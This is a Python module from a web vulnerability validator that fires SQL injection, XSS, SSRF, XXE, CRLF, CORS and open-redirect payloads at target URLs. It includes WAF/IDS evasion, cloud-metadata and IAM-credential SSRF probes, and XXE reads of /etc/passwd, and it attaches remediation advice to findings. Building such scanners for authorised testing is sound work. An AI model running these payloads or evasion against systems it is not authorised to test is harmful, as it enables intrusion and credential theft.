"""
HEAVEN — Advanced Vulnerability Validator
Full-spectrum vulnerability validation with WAF/IDS evasion, obfuscated payloads,
active injection testing (SQLi, XSS, SSRF, SSTI, CORS, Open Redirect, CRLF, XXE).
Generates remediation patches for all confirmed findings.
Cross-platform: Linux, macOS, Windows.
"""

from __future__ import annotations

import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Optional

try:
    import aiohttp
except ImportError:
    aiohttp = None  # type: ignore[assignment]

from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.validator")


@dataclass
class ValidationResult:
    vuln_type: str
    target_url: str
    param: str = ""
    method: str = ""
    result: str = "inconclusive"  # confirmed, likely, inconclusive, false_positive
    confidence: float = 0.0
    evidence: dict = field(default_factory=dict)
    duration_ms: float = 0.0
    request_sent: str = ""
    response_snippet: str = ""
    evasion_technique: str = ""
    patch: str = ""              # Auto-generated remediation patch


# ── Evasion-Aware Request Helper ──

async def _evasive_request(session: aiohttp.ClientSession, method: str, url: str,
                            params: Optional[dict[Any, Any]] = None, data: Optional[dict[Any, Any]] = None,
                            headers: Optional[dict[Any, Any]] = None, timeout: float = 10.0,
                            allow_redirects: bool = True) -> tuple[int, str, dict]:
    """Send a request with evasive headers (User-Agent rotation, etc.)."""
    try:
        from heaven.recon.evasion_engine import build_evasive_headers, get_profile, StealthLevel
        profile = get_profile(StealthLevel.NORMAL)
        req_headers = build_evasive_headers(profile)
    except ImportError:
        req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"}

    if headers:
        req_headers.update(headers)

    try:
        kwargs: dict[str, Any] = {
            "headers": req_headers,
            "timeout": aiohttp.ClientTimeout(total=timeout),
            "allow_redirects": allow_redirects,
        }
        if params:
            kwargs["params"] = params
        if data:
            kwargs["data"] = data

        async with session.request(method, url, **kwargs) as resp:
            body = await resp.text()
            return resp.status, body, dict(resp.headers)
    except Exception as e:
        return 0, str(e), {}


# ── SQL Injection (Boolean + Time-Based + Error-Based + Union) ──

async def validate_sqli(session: aiohttp.ClientSession, url: str, param: str,
                         method: str = "GET", timeout: float = 10.0) -> ValidationResult:
    """Multi-technique SQLi validation with WAF evasion."""
    result = ValidationResult(vuln_type="sqli", target_url=url, param=param, method=method)
    start = time.time()

    try:
        from heaven.recon.evasion_engine import PayloadObfuscator
        obfuscate = True
    except ImportError:
        obfuscate = False

    # 1. Boolean-based inference
    boolean_pairs = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1'--", "' OR '1'='2'--"),
        ("1 AND 1=1", "1 AND 1=2"),
        (") AND (1=1", ") AND (1=2"),
    ]

    for true_payload, false_payload in boolean_pairs:
        # Generate obfuscated variants
        true_variants = [true_payload]
        false_variants = [false_payload]
        if obfuscate:
            true_variants = PayloadObfuscator.sqli_obfuscate(true_payload)[:3]
            false_variants = PayloadObfuscator.sqli_obfuscate(false_payload)[:3]

        for tv, fv in zip(true_variants, false_variants):
            true_status, true_body, _ = await _evasive_request(
                session, method, url, params={param: tv} if method == "GET" else None,
                data={param: tv} if method != "GET" else None, timeout=timeout)
            false_status, false_body, _ = await _evasive_request(
                session, method, url, params={param: fv} if method == "GET" else None,
                data={param: fv} if method != "GET" else None, timeout=timeout)

            len_diff = abs(len(true_body) - len(false_body))
            status_diff = true_status != false_status

            if status_diff or len_diff > 50:
                result.result = "confirmed" if len_diff > 200 or status_diff else "likely"
                result.confidence = 0.92 if status_diff else min(len_diff / 500, 0.85)
                result.evidence = {
                    "technique": "boolean_inference", "payload": tv,
                    "true_status": true_status, "false_status": false_status,
                    "length_diff": len_diff,
                }
                result.evasion_technique = "obfuscated" if tv != true_payload else "direct"
                result.patch = ("Use parameterised queries. Never concatenate user input into SQL.\n"
                                "Example: cursor.execute('SELECT * FROM t WHERE id = %s', (user_input,))")
                result.duration_ms = (time.time() - start) * 1000
                return result

    # 2. Error-based detection
    error_payloads = ["'", "\"", "' OR ''='", "1'", "1\"", "'--", "';", "1;"]
    sql_error_patterns = [
        "sql syntax", "mysql", "postgresql", "sqlite", "oracle",
        "unclosed quotation", "unterminated string", "syntax error",
        "you have an error", "ORA-", "PG::SyntaxError", "SQLSTATE",
    ]

    for payload in error_payloads:
        status, body, _ = await _evasive_request(
            session, method, url, params={param: payload} if method == "GET" else None,
            data={param: payload} if method != "GET" else None, timeout=timeout)
        body_lower = body.lower()
        for err in sql_error_patterns:
            if err.lower() in body_lower:
                result.result = "confirmed"
                result.confidence = 0.88
                result.evidence = {"technique": "error_based", "payload": payload,
                                   "error_pattern": err, "status": status}
                result.patch = "Use parameterised queries. Enable custom error pages to suppress SQL error details."
                result.duration_ms = (time.time() - start) * 1000
                return result

    # 3. Time-based blind
    time_payloads = [
        "' OR SLEEP(3)--",
        "' OR pg_sleep(3)--",
        "'; WAITFOR DELAY '00:00:03'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    ]

    for payload in time_payloads:
        t0 = time.time()
        await _evasive_request(session, method, url,
                                params={param: payload} if method == "GET" else None,
                                data={param: payload} if method != "GET" else None,
                                timeout=15)
        elapsed = (time.time() - t0) * 1000
        if elapsed > 2800:  # ~3 second delay
            result.result = "confirmed"
            result.confidence = 0.85
            result.evidence = {"technique": "time_based_blind", "payload": payload,
                               "response_ms": elapsed}
            result.patch = "Use parameterised queries. Implement query timeout limits."
            break

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── XSS (Reflection + DOM + Stored indicators) ──

async def validate_xss(session: aiohttp.ClientSession, url: str, param: str,
                        method: str = "GET", timeout: float = 10.0) -> ValidationResult:
    """Multi-context XSS validation with canary reflection and WAF bypass."""
    result = ValidationResult(vuln_type="xss", target_url=url, param=param, method=method)
    start = time.time()

    canary = f"hvn{uuid.uuid4().hex[:8]}"

    # Context-aware payloads
    payloads = [
        (f"<{canary}>", f"<{canary}>", "html_tag"),
        (f'"{canary}', canary, "attribute_break"),
        (f"'{canary}", canary, "single_quote_attr"),
        (f"<img src=x onerror={canary}>", canary, "event_handler"),
        (f"<svg onload={canary}>", canary, "svg_event"),
        (f"javascript:{canary}", canary, "js_protocol"),
        (f"<details open ontoggle={canary}>", canary, "details_event"),
        (f"<math><mtext><table><mglyph><style><!--</style><img src=x onerror={canary}>", canary, "nested_bypass"),
    ]

    try:
        from heaven.recon.evasion_engine import PayloadObfuscator
        # Add obfuscated variants for the first payload
        obf = PayloadObfuscator.xss_obfuscate(f"<img src=x onerror=alert({canary})>")
        for o in obf[:3]:
            payloads.append((o, canary, "obfuscated"))
    except ImportError:
        pass

    for payload, marker, context in payloads:
        status, body, headers = await _evasive_request(
            session, method, url, params={param: payload} if method == "GET" else None,
            data={param: payload} if method != "GET" else None, timeout=timeout)

        # Check if canary reflected unencoded
        if f"<{canary}>" in body:
            result.result = "confirmed"
            result.confidence = 0.93
            result.evidence = {"payload": payload, "reflected_as": f"<{canary}>", "context": context}
            result.patch = "Apply output encoding (HTML entity encoding). Implement Content-Security-Policy header."
            break
        elif canary in body:
            # Check specific context
            csp = headers.get("Content-Security-Policy", "")
            if not csp:
                result.result = "likely"
                result.confidence = 0.65
                result.evidence = {"payload": payload, "canary_found": True, "context": context,
                                   "csp_missing": True}
                result.patch = "Add Content-Security-Policy header. Apply context-aware output encoding."

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── SSRF (Multi-vector: DNS Callback, Cloud Metadata, Internal) ──

async def validate_ssrf(session: aiohttp.ClientSession, url: str, param: str,
                         callback_domain: str = "internal.heaven.local",
                         method: str = "GET", timeout: float = 10.0) -> ValidationResult:
    """SSRF validation with cloud metadata, internal network, and callback variants."""
    result = ValidationResult(vuln_type="ssrf", target_url=url, param=param, method=method)
    start = time.time()

    probe_id = uuid.uuid4().hex[:8]

    try:
        from heaven.recon.evasion_engine import PayloadObfuscator
        base_urls = PayloadObfuscator.ssrf_obfuscate("http://127.0.0.1:80/")
    except ImportError:
        base_urls = ["http://127.0.0.1:80/"]

    # Add cloud metadata endpoints
    cloud_urls = [
        "http://169.254.169.254/latest/meta-data/",           # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        f"http://{probe_id}.{callback_domain}/",               # Callback
        "http://[::1]:80/",                                     # IPv6 localhost
        "http://0.0.0.0:80/",
        "file:///etc/passwd",                                   # File scheme
        "dict://localhost:11211/stat",                          # Dict scheme (memcached)
        "gopher://localhost:6379/_INFO",                        # Gopher (Redis)
    ]

    all_urls = base_urls + cloud_urls
    indicators = [
        "ami-id", "instance-id", "meta-data", "iam", "security-credentials",
        "root:x:0", "/bin/bash", "daemon:x:",
        "computeMetadata", "google.internal",
        "STAT items", "+OK", "-ERR",  # Memcached / Redis
    ]

    for probe_url in all_urls[:12]:
        status, body, _ = await _evasive_request(
            session, method, url, params={param: probe_url} if method == "GET" else None,
            data={param: probe_url} if method != "GET" else None, timeout=timeout)

        body_lower = body.lower()
        for indicator in indicators:
            if indicator.lower() in body_lower:
                result.result = "confirmed"
                result.confidence = 0.9
                result.evidence = {"probe_url": probe_url, "indicator": indicator,
                                   "response_length": len(body)}
                result.patch = ("Validate URLs against allowlist. Block private IP ranges. "
                                "Disable unnecessary URL schemes (file://, gopher://, dict://).")
                result.duration_ms = (time.time() - start) * 1000
                return result

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── CORS Misconfiguration ──

async def validate_cors(session: aiohttp.ClientSession, url: str,
                         timeout: float = 10.0) -> ValidationResult:
    """Check for CORS misconfig with credential leaking."""
    result = ValidationResult(vuln_type="cors_misconfig", target_url=url)
    start = time.time()

    origins = ["https://evil.com", "null", "https://attacker.example.com",
               "https://evil.com%0d%0a", "https://evil.com/.example.com"]

    for origin in origins:
        status, body, headers = await _evasive_request(
            session, "GET", url, headers={"Origin": origin}, timeout=timeout)
        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "")

        if acao == origin or acao == "*":
            result.result = "confirmed" if acac.lower() == "true" else "likely"
            result.confidence = 0.92 if acac.lower() == "true" else 0.7
            result.evidence = {"origin_sent": origin, "acao": acao, "credentials": acac}
            result.patch = ("Restrict Access-Control-Allow-Origin to specific trusted domains. "
                            "Never reflect arbitrary Origin headers with credentials.")
            break

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── Open Redirect ──

async def validate_open_redirect(session: aiohttp.ClientSession, url: str, param: str,
                                  method: str = "GET", timeout: float = 10.0) -> ValidationResult:
    """Open redirect validation without following redirects."""
    result = ValidationResult(vuln_type="open_redirect", target_url=url, param=param, method=method)
    start = time.time()

    test_urls = [
        "https://evil.example.com", "//evil.example.com",
        "/\\evil.example.com", "/%0d%0aLocation:%20https://evil.example.com",
        "https://evil.example.com%00.trusted.com",
    ]

    for test_url in test_urls:
        status, body, headers = await _evasive_request(
            session, "GET", url, params={param: test_url},
            timeout=timeout, allow_redirects=False)
        location = headers.get("Location", "")
        if "evil.example.com" in location:
            result.result = "confirmed"
            result.confidence = 0.95
            result.evidence = {"redirect_to": location, "payload": test_url}
            result.patch = "Validate redirect URLs against an allowlist of trusted domains."
            break

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── XXE (XML External Entity Injection) ──

async def validate_xxe(session: aiohttp.ClientSession, url: str,
                        timeout: float = 10.0) -> ValidationResult:
    """XXE detection via DTD entity expansion probe."""
    result = ValidationResult(vuln_type="xxe", target_url=url, method="POST")
    start = time.time()

    canary = uuid.uuid4().hex[:8]
    xxe_payloads = [
        f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "{canary}">]><root>&xxe;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>''',
    ]

    for payload in xxe_payloads:
        try:
            async with session.post(url, data=payload,
                                     headers={"Content-Type": "application/xml"},
                                     timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                body = await resp.text()
                if canary in body or any(ind in body for ind in ["root:x:0", "/bin/bash", "daemon:x:", "localhost"]):
                    result.result = "confirmed"
                    result.confidence = 0.9
                    result.evidence = {"payload_type": "file_read", "indicator_found": True}
                    result.patch = "Disable DTD processing. Use defusedxml library for Python XML parsing."
                    break
        except Exception:
            pass

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── CRLF Injection ──

async def validate_crlf(session: aiohttp.ClientSession, url: str, param: str,
                         timeout: float = 10.0) -> ValidationResult:
    """CRLF injection detection via header injection probe."""
    result = ValidationResult(vuln_type="crlf_injection", target_url=url, param=param)
    start = time.time()

    canary = f"X-HEAVEN-{uuid.uuid4().hex[:6]}"
    payloads = [
        f"%0d%0a{canary}:injected",
        f"%0a{canary}:injected",
        f"\r\n{canary}:injected",
    ]

    for payload in payloads:
        status, body, headers = await _evasive_request(
            session, "GET", url, params={param: payload}, timeout=timeout)
        if canary.lower() in str(headers).lower():
            result.result = "confirmed"
            result.confidence = 0.9
            result.evidence = {"payload": payload, "injected_header": canary}
            result.patch = "Strip \\r\\n from user input before including in HTTP responses."
            break

    result.duration_ms = (time.time() - start) * 1000
    return result


# ── Master Validation Entry Point ──

ALL_VALIDATORS = {
    "sqli": validate_sqli,
    "xss": validate_xss,
    "ssrf": validate_ssrf,
    "cors": validate_cors,
    "open_redirect": validate_open_redirect,
    "xxe": validate_xxe,
    "crlf": validate_crlf,
}


async def validate_findings(scan_id: str = "", findings: Optional[list[dict[Any, Any]]] = None, **kwargs) -> dict[str, Any]:
    """Run all safe validation checks on discovered input vectors."""
    findings = findings or []
    logger.info(f"Starting advanced PoC validation for {len(findings)} findings...")

    validated = []
    stats = {"confirmed": 0, "likely": 0, "inconclusive": 0, "false_positive": 0}

    # Execute real validation engines using aiohttp
    import aiohttp
    import asyncio
    
    tasks = []
    # Identify which findings are actually web input vectors (from crawler or advanced_attacks)
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=50)
    ) as session:
        for f in findings:
            vuln_type = f.get("type", f.get("category", "")).lower()
            url = f.get("target", f.get("url", ""))
            if not url.startswith("http"):
                continue
            
            param = f.get("param", "")
            method = f.get("method", "GET")
            
            if "sqli" in vuln_type or "sql injection" in vuln_type:
                tasks.append(validate_sqli(session, url, param, method))
            elif "xss" in vuln_type or "cross-site scripting" in vuln_type:
                tasks.append(validate_xss(session, url, param, method))
            elif "ssrf" in vuln_type:
                tasks.append(validate_ssrf(session, url, param, method))
            elif "cors" in vuln_type:
                tasks.append(validate_cors(session, url))
            elif "open redirect" in vuln_type:
                tasks.append(validate_open_redirect(session, url, param, method))
            elif "xxe" in vuln_type:
                tasks.append(validate_xxe(session, url))
            elif "crlf" in vuln_type:
                tasks.append(validate_crlf(session, url, param))

        results = []
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)

        # Run results through the FP-suppression layer before reporting.
        # This is what gives findings their `confidence_bucket` and reasons.
        from heaven.vulnscan.fp_suppress import suppress_finding, apply_verdict

        for res in results:
            if isinstance(res, Exception):
                logger.error(f"Validator failed: {res}")
                continue
            if not isinstance(res, ValidationResult):
                continue

            # Build a finding dict the suppressor understands
            finding_dict = {
                "vuln_type": res.vuln_type,
                "target_url": res.target_url,
                "target": res.target_url,
                "param": res.param,
                "method": res.method,
                "result": res.result,
                "confidence": res.confidence,
                "evidence": res.evidence,
            }

            # Only suppress findings that the primary validator confirmed/likely.
            # Inconclusive/false_positive get passed through with their own disposition.
            if res.result in ("confirmed", "likely"):
                try:
                    verdict = await suppress_finding(session, finding_dict)
                    finding_dict = apply_verdict(finding_dict, verdict)
                except Exception as e:
                    logger.warning(f"FP suppressor errored on {res.vuln_type} {res.param}: {e}")

            res_status = finding_dict.get("result", res.result)
            if res_status == "confirmed":
                stats["confirmed"] += 1
            elif res_status == "likely":
                stats["likely"] += 1
            elif res_status == "false_positive":
                stats["false_positive"] += 1
            else:
                stats["inconclusive"] += 1

            val_res = {
                "vuln_type": res.vuln_type,
                "target": res.target_url,
                "param": res.param,
                "method": res.method,
                "result": res_status,
                "confidence": finding_dict.get("confidence", res.confidence),
                "confidence_bucket": finding_dict.get("confidence_bucket", ""),
                "fp_check_reasons": finding_dict.get("fp_check_reasons", []),
                "fp_check_evidence": finding_dict.get("fp_check_evidence", {}),
                "suppressed": finding_dict.get("suppressed", False),
                "severity": "critical" if res_status == "confirmed" and res.vuln_type in ["sqli", "xxe"] else "high",
                "title": f"{res.vuln_type.upper()} via {res.param} parameter",
                "evidence": res.evidence,
                "patch": res.patch,
            }
            # Drop suppressed findings from the report (they're below 0.40 confidence)
            if val_res["suppressed"]:
                continue
            if res_status in ["confirmed", "likely"]:
                validated.append(val_res)

    return {
        "total_validated": len(findings),
        "confirmed": stats["confirmed"],
        "likely": stats["likely"],
        "inconclusive": stats["inconclusive"],
        "false_positive": stats["false_positive"],
        "validated_findings": validated,
        "validators_available": list(ALL_VALIDATORS.keys()),
    }
